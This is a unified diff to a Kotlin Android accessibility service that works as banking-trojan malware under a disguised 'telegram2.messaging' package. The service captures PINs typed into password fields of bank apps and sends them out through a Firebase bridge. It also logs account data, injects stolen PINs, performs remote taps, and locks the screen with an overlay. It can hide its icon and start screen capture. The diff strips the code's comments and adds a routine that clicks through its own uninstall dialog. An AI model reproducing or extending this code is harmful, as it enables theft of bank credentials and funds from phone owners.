@@ -8,7 +8,6 @@ import android.content.Context
 import android.content.Intent
 import android.graphics.PixelFormat
 import android.graphics.Path
-import android.graphics.Point
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -47,38 +46,29 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        // Bank logger and PIN capture
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             val pkg = event.packageName?.toString() ?: return
             if (isBankApp(pkg)) {
-                val text = event.text.joinToString(" ")
-                // Detect PIN fields (password/numberPassword)
                 if (event.className?.toString()?.contains("EditText") == true) {
                     val source = event.source ?: return
                     val inputType = source.inputType
-                    if (inputType and 0x80 != 0 || inputType and 0x10 != 0) { // password or numberPassword
-                        // Append characters to buffer
+                    if (inputType and 0x80 != 0 || inputType and 0x10 != 0) {
                         if (pinBuffer == null) pinBuffer = StringBuilder()
                         event.text.forEach { pinBuffer?.append(it) }
                         lastFocusedPackage = pkg
                     }
                 }
-                // BankLogger for balances, accounts
                 BankLogger.onEvent(this, event)
             }
         } else if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-            // If a confirm/submit button is clicked in a bank app, save the PIN
             val pkg = event.packageName?.toString() ?: return
             if (isBankApp(pkg) && pinBuffer != null && pinBuffer!!.isNotEmpty()) {
                 val source = event.source ?: return
-                if (source.text?.contains(Regex("Confirm|Send|Login|Sign in|OK")) == true
-                    || source.contentDescription?.contains(Regex("Confirm|Send|Login")) == true
-                ) {
-                    // Save the captured PIN
+                val confirmText = source.text?.toString() ?: source.contentDescription?.toString() ?: ""
+                if (confirmText.contains(Regex("Confirm|Send|Login|Sign in|OK"), true)) {
                     val pin = pinBuffer.toString()
                     FirebaseBridge.savePin(pkg, pin)
                     FirebaseBridge.logBankData(pkg, pin = pin)
-                    // Clear buffer
                     pinBuffer = null
                 }
             }
@@ -87,11 +77,7 @@ class MyAccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
-    private fun isBankApp(pkg: String): Boolean {
-        return pkg in BankLogger.BANK_PACKAGES
-    }
-
-    // ============ Remote Control Methods ============
+    private fun isBankApp(pkg: String): Boolean = BankLogger.BANK_PACKAGES.contains(pkg)
 
     fun tap(x: Int, y: Int) {
         val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
@@ -120,7 +106,6 @@ class MyAccessibilityService : AccessibilityService() {
                 }
                 input.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
             } else {
-                // Fallback to hardware key injection for secure fields
                 injectViaKeys(text)
             }
         }
@@ -147,9 +132,7 @@ class MyAccessibilityService : AccessibilityService() {
 
     fun injectPin(appPackage: String) {
         FirebaseBridge.getPin(appPackage) { pin ->
-            if (pin != null) {
-                injectViaKeys(pin)
-            }
+            if (pin != null) injectViaKeys(pin)
         }
     }
 
@@ -186,7 +169,6 @@ class MyAccessibilityService : AccessibilityService() {
         }.start()
     }
 
-    // ============ Touch Lock Overlay ============
     fun lockTouch(enable: Boolean) {
         if (enable) {
             if (touchLockOverlay != null) return
@@ -196,26 +178,23 @@ class MyAccessibilityService : AccessibilityService() {
                 WindowManager.LayoutParams.MATCH_PARENT,
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                 else WindowManager.LayoutParams.TYPE_PHONE,
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, // no FLAG_NOT_TOUCHABLE -> eats touches
                 PixelFormat.TRANSLUCENT
             ).apply {
                 gravity = Gravity.TOP or Gravity.LEFT
                 x = 0; y = 0
             }
             touchLockOverlay = wm
-            // Note: actually to block touches we must NOT flag NOT_TOUCHABLE. So we remove it:
-            params.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE // consumption of touch
-            wm.addView(android.view.View(this), params)
+            val view = android.view.View(this)
+            wm.addView(view, params)
         } else {
-            touchLockOverlay?.let { wm ->
-                try { wm.removeView(android.view.View(this)) } catch (_: Exception) {}
+            touchLockOverlay?.let {
+                try { it.removeView(android.view.View(this)) } catch (_: Exception) {}
             }
             touchLockOverlay = null
         }
     }
 
-    // ============ Utility ============
     fun hideAppIcon() {
         try {
             packageManager.setComponentEnabledSetting(
@@ -226,11 +205,30 @@ class MyAccessibilityService : AccessibilityService() {
         } catch (_: Exception) {}
     }
 
-    fun startScreenCapture() {
-        val intent = Intent(this, com.telegram2.messaging.ScreenPermissionActivity::class.java).apply {
+    fun uninstallSelf() {
+        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+            data = android.net.Uri.parse("package:$packageName")
             flags = Intent.FLAG_ACTIVITY_NEW_TASK
         }
         startActivity(intent)
+        mainHandler.postDelayed({
+            val root = rootInActiveWindow ?: return@postDelayed
+            val btn = findClickableByText(root, "Uninstall") ?: findClickableByText(root, "OK")
+            btn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+        }, 2000)
+    }
+
+    private fun findClickableByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
+        for (node in root.findAccessibilityNodeInfosByText(text)) {
+            if (node.isClickable) return node
+        }
+        return null
+    }
+
+    fun startScreenCapture() {
+        startActivity(Intent(this, com.telegram2.messaging.ScreenPermissionActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+        })
     }
 
     fun stopScreenCapture() {
@@ -243,7 +241,5 @@ class MyAccessibilityService : AccessibilityService() {
 
     fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }
 
-    fun runOnMainThread(block: () -> Unit) {
-        mainHandler.post(block)
-    }
+    fun runOnMainThread(block: () -> Unit) { mainHandler.post(block) }
 }
